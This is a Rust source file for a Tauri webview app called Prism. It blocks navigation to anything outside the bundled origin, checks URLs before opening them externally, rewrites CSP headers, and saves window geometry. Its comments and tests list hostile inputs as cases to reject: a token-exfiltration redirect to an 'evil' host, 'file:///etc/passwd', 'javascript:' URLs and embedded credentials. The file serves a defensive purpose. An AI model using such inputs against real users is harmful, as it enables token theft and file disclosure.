//! The main webview window: host hook injection, navigation lockdown, and
//! (desktop) window-geometry persistence.

use tauri::webview::NewWindowResponse;
use tauri::{App, Manager, Runtime, Url, WebviewUrl, WebviewWindow, WebviewWindowBuilder};

use crate::state::AppState;
use crate::MAIN_WINDOW;

/// The page may only ever be the bundled app (`tauri://localhost` on macOS/iOS,
/// `http(s)://tauri.localhost` on Windows/Android). The IPC capability is
/// scoped to that local origin, so nothing remote can call the shell.
pub fn is_app_url(url: &Url) -> bool {
    match url.scheme() {
        "tauri" => url.host_str() == Some("localhost"),
        "http" | "https" => url.host_str() == Some("tauri.localhost"),
        _ => false,
    }
}

/// What the webview may do with a navigation request.
///
/// Tauri/wry's navigation callback carries only the URL, not whether it is the
/// main frame or a subframe, so the rule has to be safe for both: the bundle
/// (and inert `about:` frames) load; EVERYTHING else is cancelled, silently and
/// without side effects. In particular a navigation never opens the system
/// browser: a `<meta refresh>` in a sandboxed website-note iframe, or
/// `location = "https://evil/?t=" + token` from injected script, goes nowhere.
/// Opening a link is a separate, explicit path: [`open_external_target`] plus
/// a native confirmation (the `open_external` command).
#[derive(Debug, PartialEq, Eq)]
pub enum NavDecision {
    Allow,
    Deny,
}

pub fn navigation_decision(url: &Url) -> NavDecision {
    if is_app_url(url) || url.scheme() == "about" {
        NavDecision::Allow
    } else {
        NavDecision::Deny
    }
}

/// Validate a URL the page asks the shell to open in the system browser /
/// mail client. `Some(url)` = eligible, and then still needs the user's native
/// confirmation; `None` = refused outright (bundle URLs, `javascript:`, `file:`,
/// custom schemes, credentials in the URL, absurd lengths).
pub fn open_external_target(raw: &str) -> Option<Url> {
    if raw.len() > 4096 {
        return None;
    }
    let url = Url::parse(raw).ok()?;
    match url.scheme() {
        "https" | "http" => {
            if url.host_str().is_none() || !url.username().is_empty() || url.password().is_some() {
                return None;
            }
        }
        "mailto" => {}
        _ => return None,
    }
    if is_app_url(&url) {
        return None;
    }
    Some(url)
}

pub fn create_main_window<R: Runtime>(app: &mut App<R>) -> tauri::Result<WebviewWindow<R>> {
    #[cfg_attr(mobile, allow(unused_variables))]
    let state = app.state::<AppState>();
    // Desktop: the origin is fixed for the process and baked into the host hook.
    // iOS: it can change in place, so the hook reads the live value from the
    // page's `prism-server-origin` meta (see `retarget_page` below).
    #[cfg(desktop)]
    let script = crate::host::init_script(state.origin().as_ref());
    #[cfg(mobile)]
    let script = crate::host::init_script(None);

    #[allow(unused_mut)]
    let mut builder =
        WebviewWindowBuilder::new(app, MAIN_WINDOW, WebviewUrl::App("index.html".into()))
            .title("Prism")
            .initialization_script(script)
            .on_navigation(|url| {
                let d = navigation_decision(url);
                if d == NavDecision::Deny {
                    log::info!("blocked a {}: navigation", url.scheme());
                }
                d == NavDecision::Allow
            });

    #[cfg(desktop)]
    {
        builder = builder
            // window.open(): the host hook routes external links through
            // open_external; anything reaching here (subframes, other schemes)
            // is refused with no side effect.
            .on_new_window(|_url, _features| NewWindowResponse::Deny)
            .min_inner_size(800.0, 600.0)
            .resizable(true);
        builder = geometry::apply_saved(builder, state.settings_dir.as_deref());
    }
    #[cfg(mobile)]
    {
        let _ = NewWindowResponse::<R>::Deny;
        let handle = app.handle().clone();
        builder = builder.on_web_resource_request(move |request, response| {
            let origin = handle.state::<AppState>().origin();
            retarget_page(request.uri().scheme_str(), response, origin.as_ref());
        });
    }

    builder.build()
}

/// iOS: every page the bundle serves gets the CSP and origin meta of the
/// CURRENT server (none on first run), so saving or clearing the server takes
/// effect on the next reload without a process restart.
#[cfg_attr(not(mobile), allow(dead_code))]
fn retarget_page(
    scheme: Option<&str>,
    response: &mut tauri::http::Response<std::borrow::Cow<'static, [u8]>>,
    origin: Option<&crate::origin::ServerOrigin>,
) {
    use tauri::http::header::{HeaderValue, CONTENT_TYPE};
    if scheme != Some("tauri") && scheme != Some("http") && scheme != Some("https") {
        return;
    }
    if let Some(csp) = response.headers_mut().get_mut("Content-Security-Policy") {
        let fresh = crate::origin::retarget_csp(csp.to_str().unwrap_or(""), origin);
        match HeaderValue::from_str(&fresh) {
            Ok(v) => *csp = v,
            // Never serve a page with a stale policy: the strictest one instead.
            Err(_) => *csp = HeaderValue::from_static("default-src 'none'"),
        }
    }
    let is_html = response
        .headers()
        .get(CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.starts_with("text/html"));
    if is_html {
        if let Some(body) = crate::origin::inject_head_meta(response.body(), origin) {
            *response.body_mut() = std::borrow::Cow::Owned(body);
        }
    }
}

#[cfg(desktop)]
pub mod geometry {
    //! Remember the main window's size, position and maximized state.

    use std::path::Path;

    use tauri::{LogicalPosition, LogicalSize, Runtime, WebviewWindow, WebviewWindowBuilder};

    use crate::settings::{self, WindowGeometry};

    const DEFAULT_SIZE: (f64, f64) = (1200.0, 800.0);

    /// Sanity-check a saved geometry (a corrupted or absurd file must not
    /// produce an invisible window).
    pub fn sane(g: &WindowGeometry) -> bool {
        let finite = [g.width, g.height, g.x, g.y].iter().all(|v| v.is_finite());
        finite
            && (400.0..=16384.0).contains(&g.width)
            && (300.0..=16384.0).contains(&g.height)
            && g.x.abs() < 32768.0
            && g.y.abs() < 32768.0
    }

    pub fn apply_saved<'a, R: Runtime, M: tauri::Manager<R>>(
        builder: WebviewWindowBuilder<'a, R, M>,
        dir: Option<&Path>,
    ) -> WebviewWindowBuilder<'a, R, M> {
        let saved = dir.and_then(|d| settings::load(d).window).filter(sane);
        match saved {
            Some(g) => builder
                .inner_size(g.width, g.height)
                .position(g.x, g.y)
                .maximized(g.maximized),
            None => builder.inner_size(DEFAULT_SIZE.0, DEFAULT_SIZE.1).center(),
        }
    }

    /// If the restored position is off every monitor (a display was
    /// unplugged), recenter.
    pub fn ensure_visible<R: Runtime>(w: &WebviewWindow<R>) {
        let (Ok(pos), Ok(monitors)) = (w.outer_position(), w.available_monitors()) else {
            return;
        };
        let on_screen = monitors.iter().any(|m| {
            let (mp, ms) = (m.position(), m.size());
            pos.x + 40 >= mp.x
                && pos.y >= mp.y - 10
                && pos.x < mp.x + ms.width as i32 - 40
                && pos.y < mp.y + ms.height as i32 - 40
        });
        if !on_screen {
            let _ = w.center();
        }
    }

    pub fn save<R: Runtime>(w: &WebviewWindow<R>, dir: &Path) {
        let Ok(scale) = w.scale_factor() else { return };
        let maximized = w.is_maximized().unwrap_or(false);
        if w.is_minimized().unwrap_or(false) || w.is_fullscreen().unwrap_or(false) {
            return; // don't remember a transient state
        }
        let (Ok(size), Ok(pos)) = (w.inner_size(), w.outer_position()) else {
            return;
        };
        let size: LogicalSize<f64> = size.to_logical(scale);
        let pos: LogicalPosition<f64> = pos.to_logical(scale);
        let mut g = WindowGeometry {
            width: size.width,
            height: size.height,
            x: pos.x,
            y: pos.y,
            maximized,
        };
        if maximized {
            // Keep the pre-maximize frame from last time rather than the screen size.
            if let Some(prev) = settings::load(dir).window.filter(sane) {
                g = WindowGeometry {
                    maximized: true,
                    ..prev
                };
            }
        }
        if sane(&g) {
            if let Err(e) = settings::update(dir, |s| s.window = Some(g)) {
                log::warn!("could not save window state: {e}");
            }
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn rejects_absurd_geometry() {
            let ok = WindowGeometry {
                width: 1200.0,
                height: 800.0,
                x: 0.0,
                y: 25.0,
                maximized: false,
            };
            assert!(sane(&ok));
            assert!(!sane(&WindowGeometry { width: 10.0, ..ok }));
            assert!(!sane(&WindowGeometry {
                height: f64::NAN,
                ..ok
            }));
            assert!(!sane(&WindowGeometry { x: 1e9, ..ok }));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn u(s: &str) -> Url {
        Url::parse(s).unwrap()
    }

    #[test]
    fn navigation_decisions() {
        use NavDecision::*;
        // The bundle loads.
        assert_eq!(navigation_decision(&u("tauri://localhost/")), Allow);
        assert_eq!(
            navigation_decision(&u("tauri://localhost/p/some-site")),
            Allow
        );
        assert_eq!(navigation_decision(&u("http://tauri.localhost/")), Allow);
        assert_eq!(navigation_decision(&u("about:srcdoc")), Allow);
        // External, whether main frame or a subframe (the callback can't tell):
        // cancelled, never opened.
        assert_eq!(
            navigation_decision(&u("https://evil.example/?t=pd_x")),
            Deny
        );
        assert_eq!(navigation_decision(&u("http://localhost:1940/")), Deny);
        assert_eq!(navigation_decision(&u("mailto:someone@example.com")), Deny);
        assert_eq!(navigation_decision(&u("tauri://evil/")), Deny);
        assert_eq!(navigation_decision(&u("file:///etc/passwd")), Deny);
        assert_eq!(navigation_decision(&u("javascript:alert(1)")), Deny);
    }

    #[test]
    fn retarget_page_rewrites_html_and_csp() {
        use crate::origin::ServerOrigin;
        let o = ServerOrigin::parse("https://b.example.com").unwrap();
        let mut resp = tauri::http::Response::builder()
            .header("Content-Type", "text/html")
            .header(
                "Content-Security-Policy",
                "default-src 'self'; connect-src 'self' https://a.example.com",
            )
            .body(std::borrow::Cow::Borrowed(
                &b"<html><head></head><body></body></html>"[..],
            ))
            .unwrap();
        retarget_page(Some("tauri"), &mut resp, Some(&o));
        let csp = resp.headers()["Content-Security-Policy"].to_str().unwrap();
        assert!(csp.contains("https://b.example.com") && !csp.contains("a.example.com"));
        let body = String::from_utf8(resp.body().to_vec()).unwrap();
        assert!(body.contains(r#"content="https://b.example.com""#));

        // A script/asset keeps its body; only HTML gets the meta.
        let mut js = tauri::http::Response::builder()
            .header("Content-Type", "text/javascript")
            .body(std::borrow::Cow::Borrowed(&b"</head>"[..]))
            .unwrap();
        retarget_page(Some("tauri"), &mut js, Some(&o));
        assert_eq!(js.body().as_ref(), b"</head>");
    }

    #[test]
    fn open_external_eligibility() {
        // Eligible -> goes on to the native confirmation.
        assert!(open_external_target("https://example.com/a").is_some());
        assert!(open_external_target("http://example.com/").is_some());
        assert!(open_external_target("mailto:someone@example.com").is_some());
        // Refused outright.
        for bad in [
            "javascript:alert(1)",
            "file:///etc/passwd",
            "tauri://localhost/",
            "http://tauri.localhost/",
            "prism://auth/callback",
            "https://user:pw@example.com/",
            "data:text/html,hi",
            "not a url",
        ] {
            assert!(open_external_target(bad).is_none(), "{bad}");
        }
        assert!(
            open_external_target(&format!("https://example.com/{}", "a".repeat(5000))).is_none()
        );
    }
}
